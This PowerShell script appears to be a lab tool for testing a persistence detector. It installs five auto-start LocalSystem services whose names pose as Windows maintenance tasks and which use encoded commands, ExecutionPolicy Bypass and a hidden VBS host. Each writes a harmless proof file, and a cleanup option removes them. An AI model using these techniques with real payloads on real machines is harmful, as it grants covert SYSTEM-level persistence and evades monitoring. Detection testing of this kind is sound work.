#Requires -RunAsAdministrator
# Lab-only Windows service persistence generator for testing defender.ps1.
# Default: installs several harmless auto-start services that write C:\Users\Public\Documents\pwned.txt after reboot.
# Cleanup: powershell.exe -ExecutionPolicy Bypass -File .\windows_services.ps1 -Cleanup -RemoveProof

param(
    [switch]$Cleanup,
    [switch]$RemoveProof
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$workDir = Join-Path $env:ProgramData 'PersistenceShowdownLab\Services'
$payloadPath = 'C:\Users\Public\Documents\pwned.txt'
$payloadText = 'Pwn3d'
$psExe = Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe'
$cmdExe = Join-Path $env:WINDIR 'System32\cmd.exe'
$wscriptExe = Join-Path $env:WINDIR 'System32\wscript.exe'
$serviceNames = @(
    'PSUnitSvcProfileCache',
    'PSUnitSvcWinUpdateCache',
    'PSUnitSvcEventBridge',
    'PSUnitSvcScriptHost',
    'PSUnitSvcUserDataSync'
)

function Write-Step { param([string]$Text) Write-Host "[*] $Text" -ForegroundColor Cyan }
function Write-OK { param([string]$Text) Write-Host "    [OK] $Text" -ForegroundColor Green }
function Write-Warn { param([string]$Text) Write-Host "    [WARN] $Text" -ForegroundColor Yellow }

function Remove-LabService {
    param([string]$Name)

    $service = Get-Service -Name $Name -ErrorAction SilentlyContinue
    if ($null -eq $service) { return }

    try {
        if ($service.Status -ne 'Stopped') {
            Stop-Service -Name $Name -Force -ErrorAction SilentlyContinue
        }
    } catch {}

    & sc.exe delete $Name | Out-Null
    for ($i = 0; $i -lt 20; $i++) {
        if ($null -eq (Get-Service -Name $Name -ErrorAction SilentlyContinue)) { break }
        Start-Sleep -Milliseconds 250
    }
    Write-OK "Deleted service $Name"
}

function Remove-LabServices {
    Write-Step "Removing Persistence Showdown services"
    foreach ($name in $serviceNames) {
        Remove-LabService -Name $name
    }
}

function Remove-LabFiles {
    Write-Step "Removing helper files"
    if (Test-Path -LiteralPath $workDir) {
        Remove-Item -LiteralPath $workDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-OK "Removed $workDir"
    }
    if ($RemoveProof -and (Test-Path -LiteralPath $payloadPath)) {
        Remove-Item -LiteralPath $payloadPath -Force -ErrorAction SilentlyContinue
        Write-OK "Removed $payloadPath"
    }
}

function New-PayloadScript {
    param([string]$Path, [int]$DelaySeconds = 0)

    $content = @"
`$ErrorActionPreference = 'SilentlyContinue'
if ($DelaySeconds -gt 0) { Start-Sleep -Seconds $DelaySeconds }
New-Item -ItemType Directory -Path 'C:\Users\Public\Documents' -Force | Out-Null
Set-Content -LiteralPath 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -NoNewline -Encoding ASCII
"@
    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII
}

function New-PayloadVbs {
    param([string]$Path)

    $content = @'
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists("C:\Users\Public\Documents") Then
    fso.CreateFolder("C:\Users\Public\Documents")
End If
Set f = fso.CreateTextFile("C:\Users\Public\Documents\pwned.txt", True)
f.Write "Pwn3d"
f.Close
'@
    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII
}

function New-EncodedPayload {
    $command = "New-Item -ItemType Directory -Path 'C:\Users\Public\Documents' -Force | Out-Null; Set-Content -LiteralPath 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -NoNewline -Encoding ASCII"
    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
}

function New-LabService {
    param(
        [string]$Name,
        [string]$DisplayName,
        [string]$Description,
        [string]$BinaryPath,
        [switch]$DelayedAuto
    )

    Remove-LabService -Name $Name

    & sc.exe create $Name binPath= $BinaryPath start= auto obj= LocalSystem DisplayName= $DisplayName | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "sc.exe create failed for $Name"
    }

    & sc.exe description $Name $Description | Out-Null
    if ($DelayedAuto) {
        & sc.exe config $Name start= delayed-auto | Out-Null
    }

    Write-OK "Created service $Name"
}

if ($Cleanup) {
    Remove-LabServices
    Remove-LabFiles
    Write-Host "[DONE] service unit-test cleanup complete" -ForegroundColor Green
    exit 0
}

Write-Step "Preparing service helper files"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
$profileCacheScript = Join-Path $workDir 'svc-profile-cache.ps1'
$eventBridgeScript = Join-Path $workDir 'svc-event-bridge.ps1'
$vbsScript = Join-Path $workDir 'svc-script-host.vbs'
New-PayloadScript -Path $profileCacheScript
New-PayloadScript -Path $eventBridgeScript -DelaySeconds 15
New-PayloadVbs -Path $vbsScript
Write-OK "Helper files written to $workDir"

Remove-LabServices

Write-Step "Installing Windows service persistence variants"
$encoded = New-EncodedPayload

New-LabService `
    -Name 'PSUnitSvcProfileCache' `
    -DisplayName 'Profile Cache Maintenance' `
    -Description 'Lab test: auto-start service that launches a ProgramData PowerShell helper.' `
    -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -File `"$profileCacheScript`""

New-LabService `
    -Name 'PSUnitSvcWinUpdateCache' `
    -DisplayName 'Windows Update Cache Monitor' `
    -Description 'Lab test: delayed auto-start service using an encoded PowerShell command.' `
    -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" `
    -DelayedAuto

New-LabService `
    -Name 'PSUnitSvcEventBridge' `
    -DisplayName 'Event Bridge Helper' `
    -Description 'Lab test: auto-start service that chains through cmd.exe to PowerShell.' `
    -BinaryPath "$cmdExe /c $psExe -NoProfile -ExecutionPolicy Bypass -File $eventBridgeScript"

New-LabService `
    -Name 'PSUnitSvcScriptHost' `
    -DisplayName 'Script Host Telemetry' `
    -Description 'Lab test: auto-start service using Windows Script Host and a VBS helper.' `
    -BinaryPath "$wscriptExe //B `"$vbsScript`""

New-LabService `
    -Name 'PSUnitSvcUserDataSync' `
    -DisplayName 'User Data Sync Service' `
    -Description 'Lab test: auto-start service using cmd.exe to write the project proof file.' `
    -BinaryPath "$cmdExe /c if not exist C:\Users\Public\Documents mkdir C:\Users\Public\Documents & echo $payloadText>$payloadPath"

Write-Host ""
Write-Host "[DONE] Installed Windows service unit-test persistences." -ForegroundColor Green
Write-Host "Reboot to let any remaining services create $payloadPath." -ForegroundColor Yellow
